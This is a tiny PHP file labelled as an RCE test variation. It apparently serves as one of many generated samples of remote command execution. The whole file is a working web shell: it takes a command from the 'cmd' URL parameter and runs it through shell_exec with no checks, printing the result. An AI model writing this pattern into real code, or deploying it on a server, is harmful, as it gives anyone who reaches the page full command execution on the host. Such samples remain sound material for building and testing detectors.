<?php
// RCE test variation #522
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>